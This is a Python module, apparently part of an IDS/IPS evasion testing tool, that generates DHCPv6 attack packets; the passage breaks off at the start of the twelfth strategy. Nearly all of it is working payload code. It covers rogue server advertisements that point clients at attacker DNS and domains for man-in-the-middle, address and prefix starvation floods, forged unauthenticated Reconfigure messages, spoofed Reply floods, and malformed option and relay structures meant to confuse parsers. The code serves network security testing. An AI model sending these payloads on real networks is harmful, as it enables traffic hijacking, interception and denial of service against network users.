import random
import struct
import socket
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# DHCPv6 mutation strategies for IDS/IPS evasion testing.
#
# Grounded in RFC 9915/8415 + extension RFCs 3319, 3646, 4704, 5007, 6355,
# 6939, 7653 + IEEE 10.1109/ACCESS.2024.3413658 (DHCPv6 starvation & DUID
# authentication research).
#
# DHCPv6: 4-byte header (msg-type 1B + txid 3B), 16-bit TLV options,
# nestable containers, UDP 546/547, DUID identifiers, Prefix Delegation.
# ---------------------------------------------------------------------------

DHCPV6_STRATEGIES = [
    "rogue_server_advertise",
    "duid_identity_attack",
    "starvation_solicit_flood",
    "option_nested_overflow",
    "relay_chain_injection",
    "ia_lifetime_confusion",
    "state_machine_desync",
    "reconfigure_forge",
    "dns_option_injection",
    "vendor_class_exploit",
    "transaction_id_manipulation",
    "prefix_delegation_abuse",
    "multiprotocol_evasion",
    "elapsed_time_preference_fuzz",
]

DHCPV6_WEIGHTS = [12, 14, 12, 14, 10, 8, 8, 6, 10, 6, 4, 8, 6, 4]

DHCPV6_STRATEGY_LABELS = {
    "rogue_server_advertise":          "Rogue Server Advertise",
    "duid_identity_attack":            "DUID Identity Attack",
    "starvation_solicit_flood":        "Starvation Solicit Flood",
    "option_nested_overflow":          "Option Nested Overflow",
    "relay_chain_injection":           "Relay Chain Injection",
    "ia_lifetime_confusion":           "IA Lifetime Confusion",
    "state_machine_desync":            "State Machine Desync",
    "reconfigure_forge":               "Reconfigure Forge",
    "dns_option_injection":            "DNS Option Injection",
    "vendor_class_exploit":            "Vendor Class Exploit",
    "transaction_id_manipulation":     "Transaction ID Manipulation",
    "prefix_delegation_abuse":         "Prefix Delegation Abuse",
    "multiprotocol_evasion":           "Multi-Protocol Evasion",
    "elapsed_time_preference_fuzz":    "Elapsed Time/Preference Fuzz",
}

# Message types
_SOLICIT = 1; _ADVERTISE = 2; _REQUEST = 3; _CONFIRM = 4
_RENEW = 5; _REBIND = 6; _REPLY = 7; _RELEASE = 8; _DECLINE = 9
_RECONFIGURE = 10; _INFORMATION_REQUEST = 11
_RELAY_FORW = 12; _RELAY_REPL = 13
_LEASEQUERY = 14; _LEASEQUERY_REPLY = 15
_DHCPV4_QUERY = 20; _DHCPV4_RESPONSE = 21
_ACTIVELEASEQUERY = 22; _STARTTLS = 23

# Option codes
_OPT_CLIENTID = 1; _OPT_SERVERID = 2
_OPT_IA_NA = 3; _OPT_IA_TA = 4; _OPT_IAADDR = 5
_OPT_ORO = 6; _OPT_PREFERENCE = 7; _OPT_ELAPSED_TIME = 8
_OPT_RELAY_MSG = 9; _OPT_AUTH = 11
_OPT_STATUS_CODE = 13; _OPT_RAPID_COMMIT = 14
_OPT_USER_CLASS = 15; _OPT_VENDOR_CLASS = 16; _OPT_VENDOR_OPTS = 17
_OPT_INTERFACE_ID = 18; _OPT_RECONF_MSG = 19; _OPT_RECONF_ACCEPT = 20
_OPT_SIP_SERVER_D = 21; _OPT_SIP_SERVER_A = 22
_OPT_DNS_SERVERS = 23; _OPT_DOMAIN_LIST = 24
_OPT_IA_PD = 25; _OPT_IAPREFIX = 26
_OPT_CLIENT_FQDN = 39; _OPT_CLIENT_LINKLAYER_ADDR = 79

_DUID_LLT = 1; _DUID_EN = 2; _DUID_LL = 3; _DUID_UUID = 4
_HW_ETHERNET = 1


def _random_mac():
    return bytes([random.randint(0, 255) for _ in range(6)])

def _random_gua():
    b = bytearray(16)
    b[0] = 0x20 | random.randint(0, 0x0F)
    for i in range(1, 16):
        b[i] = random.randint(0, 255)
    return bytes(b)

def _random_lla():
    b = bytearray(16)
    b[0] = 0xFE; b[1] = 0x80
    for i in range(8, 16):
        b[i] = random.randint(0, 255)
    return bytes(b)

def _random_txid():
    return random.randint(0, 0xFFFFFF)

def _opt(code, data):
    data = data[:0xFFFF]  # DHCPv6 option-len is 16-bit
    return struct.pack("!HH", code, len(data)) + data

def _dhcpv6_header(msg_type, txid=None):
    if txid is None:
        txid = _random_txid()
    return struct.pack("!I", (msg_type << 24) | (txid & 0xFFFFFF))

def _relay_header(msg_type, hop_count, link_addr, peer_addr):
    return struct.pack("!BB", msg_type, hop_count) + link_addr + peer_addr

def _duid_llt(mac=None, time_val=None):
    mac = mac or _random_mac()
    if time_val is None:
        time_val = random.randint(0, 0xFFFFFFFF)
    return struct.pack("!HHI", _DUID_LLT, _HW_ETHERNET, time_val) + mac

def _duid_en(enterprise=None, vendor_id=None):
    if enterprise is None:
        enterprise = random.choice([9, 311, 2636, 8072, random.randint(1, 0xFFFFFFFF)])
    if vendor_id is None:
        vendor_id = bytes([random.randint(0, 255) for _ in range(random.randint(4, 20))])
    return struct.pack("!HI", _DUID_EN, enterprise) + vendor_id

def _duid_ll(mac=None):
    mac = mac or _random_mac()
    return struct.pack("!HH", _DUID_LL, _HW_ETHERNET) + mac

def _duid_uuid(uuid_bytes=None):
    if uuid_bytes is None:
        uuid_bytes = bytes([random.randint(0, 255) for _ in range(16)])
    return struct.pack("!H", _DUID_UUID) + uuid_bytes

def _random_duid():
    return random.choice([_duid_llt, _duid_en, _duid_ll, _duid_uuid])()

def _client_id(duid=None):
    return _opt(_OPT_CLIENTID, duid or _random_duid())

def _server_id(duid=None):
    return _opt(_OPT_SERVERID, duid or _random_duid())

def _ia_addr(addr=None, preferred=3600, valid=7200, sub_opts=b""):
    addr = addr or _random_gua()
    return _opt(_OPT_IAADDR, addr + struct.pack("!II", preferred, valid) + sub_opts)

def _ia_na(iaid=None, t1=1800, t2=2880, sub_opts=b""):
    if iaid is None:
        iaid = random.randint(1, 0xFFFFFFFF)
    return _opt(_OPT_IA_NA, struct.pack("!III", iaid, t1, t2) + sub_opts)

def _ia_pd(iaid=None, t1=1800, t2=2880, sub_opts=b""):
    if iaid is None:
        iaid = random.randint(1, 0xFFFFFFFF)
    return _opt(_OPT_IA_PD, struct.pack("!III", iaid, t1, t2) + sub_opts)

def _ia_prefix(preferred=3600, valid=7200, prefix_len=48, prefix=None, sub_opts=b""):
    if prefix is None:
        prefix = bytes([0x20, 0x01, 0x0D, 0xB8] + [random.randint(0, 255) for _ in range(12)])
    return _opt(_OPT_IAPREFIX, struct.pack("!IIB", preferred, valid, prefix_len) + prefix + sub_opts)

def _status_code(code=0, message=b""):
    return _opt(_OPT_STATUS_CODE, struct.pack("!H", code) + message)

def _elapsed_time(val=0):
    return _opt(_OPT_ELAPSED_TIME, struct.pack("!H", val))

def _oro(*codes):
    return _opt(_OPT_ORO, b"".join(struct.pack("!H", c) for c in codes))

def _dns_encode(name):
    out = b""
    for label in name.split("."):
        lbl = label.encode("ascii", errors="ignore")
        out += bytes([len(lbl)]) + lbl
    return out + b"\x00"

def _dhcpv6_packet(msg_type, txid=None, options=b""):
    return _dhcpv6_header(msg_type, txid) + options

def _relay_packet(msg_type=_RELAY_FORW, hop_count=0, link_addr=None,
                  peer_addr=None, inner_msg=None, extra_opts=b""):
    link_addr = link_addr or _random_gua()
    peer_addr = peer_addr or _random_lla()
    hdr = _relay_header(msg_type, hop_count, link_addr, peer_addr)
    relay_opt = _opt(_OPT_RELAY_MSG, inner_msg) if inner_msg else b""
    return hdr + relay_opt + extra_opts


def build_dhcpv6_payload(strategy):
    """Build one DHCPv6 payload. Returns (payload_bytes, dst_port).
    dst_port is 547 (client->server) or 546 (server->client)."""
    fn = _STRATEGY_MAP.get(strategy)
    if fn:
        return fn()
    opts = _client_id() + _elapsed_time(0) + _ia_na()
    return _dhcpv6_packet(_SOLICIT, options=opts), 547


# ── Strategy 1: Rogue Server Advertise ────────────────────────────────────

def _build_rogue_server_advertise():
    atk_dns = bytes([0xFD, 0x00] + [random.randint(0, 255) for _ in range(14)])
    srv_duid = _duid_llt()
    txid = _random_txid()
    offered = _random_gua()
    v = random.choice(["dns_hijack", "pref_max", "rapid_hijack",
                        "domain_poison", "sip_redirect", "full_mitm", "race"])
    if v == "dns_hijack":
        opts = (_server_id(srv_duid) + _client_id() + _opt(_OPT_PREFERENCE, b"\xFF") +
                _ia_na(sub_opts=_ia_addr(offered)) + _opt(_OPT_DNS_SERVERS, atk_dns))
        return _dhcpv6_packet(_ADVERTISE, txid, opts), 546
    elif v == "pref_max":
        opts = (_server_id(srv_duid) + _client_id() + _opt(_OPT_PREFERENCE, b"\xFF") +
                _ia_na(t1=0, t2=0, sub_opts=_ia_addr(offered, preferred=86400, valid=172800)))
        return _dhcpv6_packet(_ADVERTISE, txid, opts), 546
    elif v == "rapid_hijack":
        opts = (_server_id(srv_duid) + _client_id() + _opt(_OPT_RAPID_COMMIT, b"") +
                _ia_na(sub_opts=_ia_addr(offered)) + _opt(_OPT_DNS_SERVERS, atk_dns) +
                _opt(_OPT_DOMAIN_LIST, _dns_encode("evil.local")))
        return _dhcpv6_packet(_REPLY, txid, opts), 546
    elif v == "domain_poison":
        doms = _dns_encode("attacker.com") + _dns_encode("evil.local")
        opts = (_server_id(srv_duid) + _client_id() + _ia_na(sub_opts=_ia_addr(offered)) +
                _opt(_OPT_DNS_SERVERS, atk_dns) + _opt(_OPT_DOMAIN_LIST, doms))
        return _dhcpv6_packet(_REPLY, txid, opts), 546
    elif v == "sip_redirect":
        opts = (_server_id(srv_duid) + _client_id() + _ia_na(sub_opts=_ia_addr(offered)) +
                _opt(_OPT_SIP_SERVER_D, _dns_encode("sip.evil.local")) +
                _opt(_OPT_SIP_SERVER_A, atk_dns))
        return _dhcpv6_packet(_ADVERTISE, txid, opts), 546
    elif v == "full_mitm":
        opts = (_server_id(srv_duid) + _client_id() + _opt(_OPT_PREFERENCE, b"\xFF") +
                _ia_na(sub_opts=_ia_addr(offered)) +
                _opt(_OPT_DNS_SERVERS, atk_dns + atk_dns) +
                _opt(_OPT_DOMAIN_LIST, _dns_encode("evil.local")) +
                _opt(_OPT_SIP_SERVER_A, atk_dns) + _opt(56, atk_dns))
        return _dhcpv6_packet(_REPLY, txid, opts), 546
    else:  # race
        pkts = b""
        for _ in range(20):
            addr = _random_gua()
            opts = (_server_id(srv_duid) + _client_id() +
                    _opt(_OPT_PREFERENCE, bytes([random.randint(200, 255)])) +
                    _ia_na(sub_opts=_ia_addr(addr)) + _opt(_OPT_DNS_SERVERS, atk_dns))
            pkts += _dhcpv6_packet(_ADVERTISE, txid, opts)
        return pkts, 546


# ── Strategy 2: DUID Identity Attack ─────────────────────────────────────

def _build_duid_identity_attack():
    v = random.choice(["oversized", "zero_len", "type_switch", "llt_time",
                        "enterprise_spoof", "uuid_extreme", "contradict", "flood"])
    if v == "oversized":
        huge = struct.pack("!HH", _DUID_LL, _HW_ETHERNET) + bytes(200)
        opts = _opt(_OPT_CLIENTID, huge) + _elapsed_time(0) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "zero_len":
        opts = _opt(_OPT_CLIENTID, b"") + _elapsed_time(0) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "type_switch":
        mac = _random_mac()
        t1, t2, t3 = _random_txid(), _random_txid(), _random_txid()
        pkts = (_dhcpv6_packet(_SOLICIT, t1, _opt(_OPT_CLIENTID, _duid_llt(mac)) + _elapsed_time(0) + _ia_na(iaid=1)) +
                _dhcpv6_packet(_REQUEST, t2, _opt(_OPT_CLIENTID, _duid_en()) + _server_id() + _ia_na(iaid=1)) +
                _dhcpv6_packet(_RENEW, t3, _opt(_OPT_CLIENTID, _duid_uuid()) + _server_id() + _ia_na(iaid=1)))
        return pkts, 547
    elif v == "llt_time":
        pkts = b""
        for t in [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF]:
            opts = _opt(_OPT_CLIENTID, _duid_llt(time_val=t)) + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "enterprise_spoof":
        pkts = b""
        for ent in [0, 9, 311, 2636, 0xFFFFFFFF]:
            vid = bytes([random.randint(0, 255) for _ in range(random.randint(1, 30))])
            duid = struct.pack("!HI", _DUID_EN, ent) + vid
            opts = _opt(_OPT_CLIENTID, duid) + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "uuid_extreme":
        pkts = b""
        for u in [b"\x00" * 16, b"\xFF" * 16, b"\xDE\xAD\xBE\xEF" * 4]:
            opts = _opt(_OPT_CLIENTID, _duid_uuid(u)) + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "contradict":
        d = _random_duid()
        opts = _opt(_OPT_CLIENTID, d) + _opt(_OPT_SERVERID, d) + _elapsed_time(0) + _ia_na()
        return _dhcpv6_packet(_REQUEST, options=opts), 547
    else:  # flood
        pkts = b""
        for _ in range(50):
            opts = _client_id() + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547


# ── Strategy 3: Starvation Solicit Flood ──────────────────────────────────

def _build_starvation_solicit_flood():
    v = random.choice(["burst", "sarr", "multi_iaid", "prefix_exhaust",
                        "rapid_flood", "decline_flood", "type_mix"])
    if v == "burst":
        pkts = b""
        for _ in range(50):
            opts = _client_id(_duid_ll()) + _elapsed_time(0) + _ia_na() + _oro(23, 24)
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "sarr":
        pkts, sd = b"", _duid_llt()
        for i in range(25):
            cd, tx = _duid_ll(), _random_txid()
            pkts += _dhcpv6_packet(_SOLICIT, tx, _opt(_OPT_CLIENTID, cd) + _elapsed_time(0) + _ia_na(iaid=i + 1))
            pkts += _dhcpv6_packet(_REQUEST, tx, _opt(_OPT_CLIENTID, cd) + _opt(_OPT_SERVERID, sd) + _ia_na(iaid=i + 1))
        return pkts, 547
    elif v == "multi_iaid":
        cd = _duid_llt()
        pkts = b""
        for iaid in range(1, 21):
            opts = _opt(_OPT_CLIENTID, cd) + _elapsed_time(0) + _ia_na(iaid=iaid)
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "prefix_exhaust":
        pkts = b""
        for _ in range(30):
            opts = _client_id(_duid_ll()) + _elapsed_time(0) + _ia_pd(sub_opts=_ia_prefix(prefix_len=48))
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "rapid_flood":
        pkts = b""
        for _ in range(40):
            opts = _client_id(_duid_ll()) + _elapsed_time(0) + _opt(_OPT_RAPID_COMMIT, b"") + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    elif v == "decline_flood":
        pkts, sd = b"", _duid_llt()
        for _ in range(30):
            opts = _client_id(_duid_ll()) + _opt(_OPT_SERVERID, sd) + _ia_na(sub_opts=_ia_addr())
            pkts += _dhcpv6_packet(_DECLINE, options=opts)
        return pkts, 547
    else:  # type_mix
        pkts = b""
        for _ in range(40):
            opts = _client_id() + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547


# ── Strategy 4: Option Nested Overflow ────────────────────────────────────

def _build_option_nested_overflow():
    v = random.choice(["len_exceeds", "zero_container", "deep_nest", "max_len",
                        "many_tiny", "dup_singleton", "unknown_codes", "container_ovf"])
    if v == "len_exceeds":
        bad = struct.pack("!HH", _OPT_IA_NA, 0xFFFF) + b"\xAA" * 10
        return _dhcpv6_packet(_SOLICIT, options=_client_id() + bad), 547
    elif v == "zero_container":
        bad = struct.pack("!HH", _OPT_IA_NA, 0)
        return _dhcpv6_packet(_SOLICIT, options=_client_id() + bad + _elapsed_time(0)), 547
    elif v == "deep_nest":
        inner = _ia_addr()
        for _ in range(15):
            inner = _ia_na(sub_opts=inner)
        return _dhcpv6_packet(_SOLICIT, options=_client_id() + inner), 547
    elif v == "max_len":
        huge = _opt(43, bytes([0xCC] * 0xFF00))  # stay under 65507 total
        return _dhcpv6_packet(_SOLICIT, options=_client_id() + huge), 547
    elif v == "many_tiny":
        opts = _client_id() + _elapsed_time(0)
        for i in range(500):
            opts += _opt((i % 200) + 100, bytes([i & 0xFF]))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "dup_singleton":
        opts = _client_id(_duid_llt()) + _client_id(_duid_ll()) + _client_id(_duid_en()) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "unknown_codes":
        opts = _client_id() + _elapsed_time(0)
        for code in [0, 0xFFFF, 0xFFFE, 65000, 32768]:
            opts += _opt(code, bytes([random.randint(0, 255) for _ in range(10)]))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    else:  # container_ovf
        iaid = random.randint(1, 0xFFFFFFFF)
        ia_data = struct.pack("!III", iaid, 1800, 2880)
        sub = _ia_addr() + _ia_addr() + _ia_addr()
        bad = struct.pack("!HH", _OPT_IA_NA, 12) + ia_data + sub
        return _dhcpv6_packet(_SOLICIT, options=_client_id() + bad), 547


# ── Strategy 5: Relay Chain Injection ─────────────────────────────────────

def _build_relay_chain_injection():
    inner = _dhcpv6_packet(_SOLICIT, options=_client_id() + _elapsed_time(0) + _ia_na())
    v = random.choice(["deep_nest", "link_spoof", "peer_mcast", "opt79_outside",
                        "missing_relay_msg", "cross_scope", "max_hop"])
    if v == "deep_nest":
        msg = inner
        for d in range(32):
            msg = _relay_packet(_RELAY_FORW, d, _random_gua(), _random_lla(), msg)
            if len(msg) > 60000:
                break
        return msg, 547
    elif v == "link_spoof":
        pkts = b""
        for addr in [b"\x00" * 16, b"\x00" * 15 + b"\x01",
                     b"\xFF\x02" + b"\x00" * 12 + b"\x01\x02",
                     b"\x00" * 10 + b"\xFF\xFF\x0A\x00\x00\x01"]:
            pkts += _relay_packet(_RELAY_FORW, 0, addr, _random_lla(), inner)
        return pkts, 547
    elif v == "peer_mcast":
        pkts = b""
        for mc in [b"\xFF\x02" + b"\x00" * 12 + b"\x01\x02", b"\xFF" * 16]:
            pkts += _relay_packet(_RELAY_FORW, 1, _random_gua(), mc, inner)
        return pkts, 547
    elif v == "opt79_outside":
        mac_opt = _opt(_OPT_CLIENT_LINKLAYER_ADDR, struct.pack("!H", _HW_ETHERNET) + _random_mac())
        opts = _client_id() + _elapsed_time(0) + _ia_na() + mac_opt
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "missing_relay_msg":
        hdr = _relay_header(_RELAY_FORW, 0, _random_gua(), _random_lla())
        return hdr + _opt(_OPT_INTERFACE_ID, b"eth0"), 547
    elif v == "cross_scope":
        lla_link = _random_lla()
        gua_peer = _random_gua()
        return _relay_packet(_RELAY_FORW, 0, lla_link, gua_peer, inner), 547
    else:  # max_hop
        msg = inner
        for d in range(255):
            msg = _relay_packet(_RELAY_FORW, d & 0xFF, _random_gua(), _random_lla(), msg)
            if len(msg) > 50000:
                break
        return msg, 547


# ── Strategy 6: IA Lifetime Confusion ─────────────────────────────────────

def _build_ia_lifetime_confusion():
    v = random.choice(["t1_gt_t2", "all_max", "pref_gt_valid", "zero_valid",
                        "prefix_len_extremes", "conflicting_lifetimes"])
    if v == "t1_gt_t2":
        opts = _client_id() + _elapsed_time(0) + _ia_na(t1=5000, t2=2000, sub_opts=_ia_addr())
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "all_max":
        opts = (_client_id() + _elapsed_time(0) +
                _ia_na(t1=0xFFFFFFFF, t2=0xFFFFFFFF,
                       sub_opts=_ia_addr(preferred=0xFFFFFFFF, valid=0xFFFFFFFF)))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "pref_gt_valid":
        opts = _client_id() + _elapsed_time(0) + _ia_na(sub_opts=_ia_addr(preferred=86400, valid=3600))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "zero_valid":
        opts = _client_id() + _elapsed_time(0) + _ia_na(t1=0, t2=0, sub_opts=_ia_addr(preferred=0, valid=0))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "prefix_len_extremes":
        pkts = b""
        for pl in [0, 1, 64, 127, 128]:
            opts = _client_id() + _elapsed_time(0) + _ia_pd(sub_opts=_ia_prefix(prefix_len=pl))
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    else:  # conflicting_lifetimes
        sub = (_ia_addr(preferred=100, valid=200) + _ia_addr(preferred=86400, valid=3600) +
               _ia_addr(preferred=0, valid=0xFFFFFFFF))
        opts = _client_id() + _elapsed_time(0) + _ia_na(sub_opts=sub)
        return _dhcpv6_packet(_SOLICIT, options=opts), 547


# ── Strategy 7: State Machine Desync ──────────────────────────────────────

def _build_state_machine_desync():
    v = random.choice(["req_no_solicit", "renew_wrong_server", "release_not_owned",
                        "confirm_wrong_link", "info_req_with_ia", "rapid_sarr", "rebind_active"])
    if v == "req_no_solicit":
        opts = _client_id() + _server_id() + _ia_na(sub_opts=_ia_addr())
        return _dhcpv6_packet(_REQUEST, options=opts), 547
    elif v == "renew_wrong_server":
        opts = _client_id() + _server_id(_duid_llt()) + _ia_na(sub_opts=_ia_addr())
        pkt1 = _dhcpv6_packet(_RENEW, options=opts)
        opts2 = _client_id() + _server_id(_duid_en()) + _ia_na(sub_opts=_ia_addr())
        pkt2 = _dhcpv6_packet(_RENEW, options=opts2)
        return pkt1 + pkt2, 547
    elif v == "release_not_owned":
        opts = _client_id() + _server_id() + _ia_na(sub_opts=_ia_addr())
        return _dhcpv6_packet(_RELEASE, options=opts), 547
    elif v == "confirm_wrong_link":
        opts = _client_id() + _ia_na(sub_opts=_ia_addr(b"\x00" * 16))
        return _dhcpv6_packet(_CONFIRM, options=opts), 547
    elif v == "info_req_with_ia":
        opts = _client_id() + _elapsed_time(0) + _ia_na() + _oro(23, 24)
        return _dhcpv6_packet(_INFORMATION_REQUEST, options=opts), 547
    elif v == "rapid_sarr":
        pkts = b""
        sd = _duid_llt()
        for _ in range(10):
            cd, tx = _duid_ll(), _random_txid()
            pkts += _dhcpv6_packet(_SOLICIT, tx, _opt(_OPT_CLIENTID, cd) + _elapsed_time(0) + _ia_na())
            pkts += _dhcpv6_packet(_REQUEST, tx, _opt(_OPT_CLIENTID, cd) + _opt(_OPT_SERVERID, sd) + _ia_na())
            pkts += _dhcpv6_packet(_RELEASE, options=_opt(_OPT_CLIENTID, cd) + _opt(_OPT_SERVERID, sd) + _ia_na())
        return pkts, 547
    else:  # rebind_active
        opts = _client_id() + _ia_na(sub_opts=_ia_addr())
        return _dhcpv6_packet(_REBIND, options=opts), 547


# ── Strategy 8: Reconfigure Forge ─────────────────────────────────────────

def _build_reconfigure_forge():
    v = random.choice(["no_auth", "bad_hmac", "wrong_reconf_type", "reconf_accept_client",
                        "wrong_server_id", "rapid_reconf"])
    if v == "no_auth":
        opts = _server_id() + _opt(_OPT_RECONF_MSG, bytes([5]))
        return _dhcpv6_packet(_RECONFIGURE, options=opts), 546
    elif v == "bad_hmac":
        auth_data = struct.pack("!BBB", 3, 1, 0) + b"\x00" * 8 + bytes([random.randint(0, 255) for _ in range(16)])
        opts = _server_id() + _opt(_OPT_RECONF_MSG, bytes([5])) + _opt(_OPT_AUTH, auth_data)
        return _dhcpv6_packet(_RECONFIGURE, options=opts), 546
    elif v == "wrong_reconf_type":
        pkts = b""
        for mt in [1, 3, 7, 8, 9, 255]:
            opts = _server_id() + _opt(_OPT_RECONF_MSG, bytes([mt]))
            pkts += _dhcpv6_packet(_RECONFIGURE, options=opts)
        return pkts, 546
    elif v == "reconf_accept_client":
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_RECONF_ACCEPT, b"") + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "wrong_server_id":
        pkts = b""
        for _ in range(5):
            opts = _server_id(_random_duid()) + _opt(_OPT_RECONF_MSG, bytes([5]))
            pkts += _dhcpv6_packet(_RECONFIGURE, options=opts)
        return pkts, 546
    else:  # rapid_reconf
        pkts = b""
        sd = _duid_llt()
        for _ in range(30):
            opts = _opt(_OPT_SERVERID, sd) + _opt(_OPT_RECONF_MSG, bytes([random.choice([5, 6, 11])]))
            pkts += _dhcpv6_packet(_RECONFIGURE, options=opts)
        return pkts, 546


# ── Strategy 9: DNS Option Injection ──────────────────────────────────────

def _build_dns_option_injection():
    v = random.choice(["long_label", "compression_ptr", "null_in_domain",
                        "fqdn_flags_conflict", "dns_loopback", "oversized_domain"])
    if v == "long_label":
        label = bytes([70]) + b"A" * 70  # label > 63 bytes (RFC violation)
        domain = label + b"\x00"
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_DOMAIN_LIST, domain) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "compression_ptr":
        # DNS compression pointer in DHCPv6 (not allowed per spec)
        domain = b"\x03foo\xC0\x00"  # pointer back to offset 0
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_DOMAIN_LIST, domain) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "null_in_domain":
        domain = b"\x07evil\x00om\x00"  # null byte embedded
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_DOMAIN_LIST, domain) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "fqdn_flags_conflict":
        # FQDN option with S+N bits both set (contradictory per RFC 4704)
        flags = 0x05  # S=1, N=1 (bits 0 and 2)
        fqdn_data = bytes([flags]) + _dns_encode("victim.evil.local")
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_CLIENT_FQDN, fqdn_data) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "dns_loopback":
        # DNS servers pointing to loopback and all-zeros
        addrs = b"\x00" * 16 + (b"\x00" * 15 + b"\x01") + (b"\xFF" * 16)
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_DNS_SERVERS, addrs) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    else:  # oversized_domain
        # Domain name > 255 bytes total
        labels = b""
        for _ in range(10):
            labels += bytes([63]) + b"x" * 63
        labels += b"\x00"
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_DOMAIN_LIST, labels) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547


# ── Strategy 10: Vendor Class Exploit ─────────────────────────────────────

def _build_vendor_class_exploit():
    v = random.choice(["ent_zero", "ent_max", "cisco_spoof", "len_mismatch",
                        "multi_vendor", "oversized_vendor"])
    if v == "ent_zero":
        data = struct.pack("!I", 0) + struct.pack("!H", 5) + b"test1"
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_VENDOR_CLASS, data) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "ent_max":
        data = struct.pack("!I", 0xFFFFFFFF) + struct.pack("!H", 5) + b"test2"
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_VENDOR_CLASS, data) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "cisco_spoof":
        data = struct.pack("!I", 9) + struct.pack("!H", 12) + b"cisco-router"
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_VENDOR_CLASS, data) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "len_mismatch":
        data = struct.pack("!I", 9) + struct.pack("!H", 100) + b"short"
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_VENDOR_CLASS, data) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "multi_vendor":
        pkts = b""
        for _ in range(3):
            ent = random.randint(0, 0xFFFFFFFF)
            data = struct.pack("!I", ent) + struct.pack("!H", 4) + b"data"
            opts = _client_id() + _elapsed_time(0) + _opt(_OPT_VENDOR_CLASS, data) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547
    else:  # oversized_vendor
        data = struct.pack("!I", 9) + struct.pack("!H", 0xFE00) + bytes([0xBB] * 0xFE00)
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_VENDOR_OPTS, data) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547


# ── Strategy 11: Transaction ID Manipulation ──────────────────────────────

def _build_transaction_id_manipulation():
    v = random.choice(["zero", "max", "reuse", "cycle", "reply_spoof", "multi_same"])
    if v == "zero":
        opts = _client_id() + _elapsed_time(0) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, 0, opts), 547
    elif v == "max":
        opts = _client_id() + _elapsed_time(0) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, 0xFFFFFF, opts), 547
    elif v == "reuse":
        tx = _random_txid()
        pkts = b""
        for _ in range(10):
            opts = _client_id() + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, tx, opts)
        return pkts, 547
    elif v == "cycle":
        pkts = b""
        for i in range(100):
            opts = _client_id() + _elapsed_time(0) + _ia_na()
            pkts += _dhcpv6_packet(_SOLICIT, i, opts)
        return pkts, 547
    elif v == "reply_spoof":
        pkts = b""
        sd = _duid_llt()
        for tx in range(20):
            opts = _opt(_OPT_SERVERID, sd) + _client_id() + _ia_na(sub_opts=_ia_addr()) + _status_code(0)
            pkts += _dhcpv6_packet(_REPLY, tx, opts)
        return pkts, 546
    else:  # multi_same
        tx = _random_txid()
        pkts = b""
        for mt in [_SOLICIT, _REQUEST, _RENEW, _RELEASE, _DECLINE, _CONFIRM]:
            opts = _client_id() + _elapsed_time(0) + _ia_na()
            if mt in (_REQUEST, _RENEW, _RELEASE, _DECLINE):
                opts += _server_id()
            pkts += _dhcpv6_packet(mt, tx, opts)
        return pkts, 547


# ── Strategy 12: Prefix Delegation Abuse ──────────────────────────────────

def _build_prefix_delegation_abuse():
